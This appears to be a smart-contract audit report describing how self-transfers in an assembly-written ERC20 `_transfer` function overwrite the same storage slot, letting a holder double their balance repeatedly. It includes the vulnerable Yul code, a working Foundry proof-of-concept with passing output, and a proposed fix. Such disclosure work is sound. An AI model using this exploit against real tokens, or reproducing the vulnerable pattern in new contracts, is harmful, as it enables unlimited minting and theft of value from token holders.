# Storage Aliasing in `_transfer` Allows Infinite Token Minting via Self-Transfer

## Root + Impact

Calling `_transfer` with `from == to` (self-transfer) causes storage slot aliasing where the same slot is written twice sequentially. The second write (adding the transfer amount) overwrites the first write (subtracting the amount), resulting in a net increase of `value` tokens instead of maintaining the balance. This allows any user to mint unlimited tokens by repeatedly transferring their balance to themselves, completely destroying the token's economic model.

## Description

In a standard ERC20 implementation, transferring tokens to oneself (`transfer(self, amount)`) should leave the balance unchanged (minus gas costs).

However, in the `_transfer` function within `ERC20Internals.sol`, the balances of `from` and `to` are loaded from storage into stack variables at the beginning of the function **before** any modifications are made.

The issue arises when `from` equals `to`. Since the code uses Yul `sstore` to write to storage, it performs the following operations in sequence:

1. Reads the old balance (e.g., 100)
2. Calculates the sender's new balance (`100 - amount`)
3. Stores the sender's new balance in storage
4. Calculates the receiver's new balance using the **old value** loaded in step 1 (`100 + amount`)
5. Stores the receiver's new balance in storage, **overwriting** the value stored in step 3

The final result is that the user's balance becomes `Balance + Amount` instead of `Balance`, meaning the balance is duplicated or increased illegitimately with each self-transfer.

```solidity
// src/helpers/ERC20Internals.sol
function _transfer(address from, address to, uint256 value) internal returns (bool success) {
    assembly ("memory-safe") {
        // ... (validation checks) ...

        let ptr := mload(0x40)
        let baseSlot := _balances.slot

        mstore(ptr, from)
        mstore(add(ptr, 0x20), baseSlot)
        let fromSlot := keccak256(ptr, 0x40)
        // @> 1. Loads 'fromAmount' (e.g., 100)
        let fromAmount := sload(fromSlot)
        
        mstore(ptr, to)
        mstore(add(ptr, 0x20), baseSlot)
        let toSlot := keccak256(ptr, 0x40)
        // @> 2. Loads 'toAmount' (e.g., 100) - If from == to, this is the same value
        let toAmount := sload(toSlot)

        if lt(fromAmount, value) {
            // ... (revert with ERC20InsufficientBalance)
        }

        // @> 3. Updates fromSlot: stores (100 - value)
        sstore(fromSlot, sub(fromAmount, value))
        
        // @> 4. Updates toSlot: stores (100 + value)
        // Since toSlot == fromSlot when from == to, this OVERWRITES step 3!
        sstore(toSlot, add(toAmount, value))
        
        success := 1
        mstore(ptr, value)
        log3(ptr, 0x20, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, from, to)
    }
}
```

**Key Technical Issue:**

When `from == to`:

- `fromSlot` and `toSlot` compute to the **same storage slot**
- Line 126: `sstore(fromSlot, sub(fromAmount, value))` stores `0` (assuming transferring full balance)
- Line 127: `sstore(toSlot, add(toAmount, value))` stores `200` (using old cached value)
- Result: The second `sstore` **overwrites** the first, leaving balance doubled

## Risk

**Likelihood**:

High. Any user holding any amount (even 1 wei) can exploit this vulnerability immediately. No special conditions required.

**Impact**:

Critical. An attacker can mint an unlimited number of tokens, completely collapsing the token's economy and draining any value associated with it in DeFi protocols. This breaks the fundamental invariant `totalSupply == sum(balances)`.

## Proof of Concept

```solidity
// test/SelfTransferExploit.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {ERC20} from "../src/ERC20.sol";

contract ERC20Harness is ERC20 {
    constructor() ERC20("Test", "TST") {}

    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}

contract SelfTransferExploitTest is Test {
    ERC20Harness public token;
    address attacker = address(0xBAD);

    function setUp() public {
        token = new ERC20Harness();
        // Give the attacker some initial tokens
        token.mint(attacker, 100e18);
    }

    function test_InfiniteMint_Via_SelfTransfer() public {
        uint256 initialBalance = token.balanceOf(attacker);
        uint256 transferAmount = 100e18;

        console.log("Attacker Initial Balance:", initialBalance);

        vm.startPrank(attacker);
        // Attack: Transfer entire balance to self
        token.transfer(attacker, transferAmount);
        vm.stopPrank();

        uint256 finalBalance = token.balanceOf(attacker);
        console.log("Attacker Final Balance:  ", finalBalance);

        // In a secure token, balance should remain 100e18.
        // In this vulnerable token, it becomes 200e18 (Original + Amount).
        assertEq(finalBalance, initialBalance + transferAmount, "Balance doubled!");
    }
}
```

## Test result

```bash
➜  2025-12-token-0x git:(main) ✗ forge test --match-test test_InfiniteMint_Via_SelfTransfer -vv

Ran 1 test for test/SelfTransferExploit.t.sol:SelfTransferExploitTest
[PASS] test_InfiniteMint_Via_SelfTransfer() (gas: 28423)
Logs:
  Attacker Initial Balance: 100000000000000000000
  Attacker Final Balance:   200000000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.46ms
```

**Analysis:**

- **Expected behavior:** Balance remains `100e18` after self-transfer
- **Actual behavior:** Balance increases to `200e18`
- **Attack complexity:** Trivial - single function call
- **Exponential exploitation:** Attacker can repeat to achieve `100 → 200 → 400 → 800...` until reaching max balance

## Recommended Mitigation

Check if `from` equals `to` at the beginning of the transfer logic. If true, skip storage updates (since net effect is zero) and only emit the event after verifying sufficient balance.

```diff
 function _transfer(address from, address to, uint256 value) internal returns (bool success) {
     assembly ("memory-safe") {
         if iszero(from) {
             mstore(0x00, shl(224, 0x96c6fd1e))
             mstore(add(0x00, 4), 0x00)
             revert(0x00, 0x24)
         }

         if iszero(to) {
             mstore(0x00, shl(224, 0xec442f05))
             mstore(add(0x00, 4), 0x00)
             revert(0x00, 0x24)
         }

+        // Fix: Early return for self-transfer
+        if eq(from, to) {
+            // Verify sender has sufficient balance
+            let ptr := mload(0x40)
+            let baseSlot := _balances.slot
+            mstore(ptr, from)
+            mstore(add(ptr, 0x20), baseSlot)
+            let fromSlot := keccak256(ptr, 0x40)
+            let fromAmount := sload(fromSlot)
+            
+            if lt(fromAmount, value) {
+                mstore(0x00, shl(224, 0xe450d38c))
+                mstore(add(0x00, 4), from)
+                mstore(add(0x00, 0x24), fromAmount)
+                mstore(add(0x00, 0x44), value)
+                revert(0x00, 0x64)
+            }
+            
+            // Emit event and return without modifying balance
+            mstore(ptr, value)
+            log3(ptr, 0x20, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, from, to)
+            success := 1
+            leave
+        }

         let ptr := mload(0x40)
         let baseSlot := _balances.slot

         mstore(ptr, from)
         mstore(add(ptr, 0x20), baseSlot)
         let fromSlot := keccak256(ptr, 0x40)
         let fromAmount := sload(fromSlot)
         // ... rest of the function
     }
 }
```
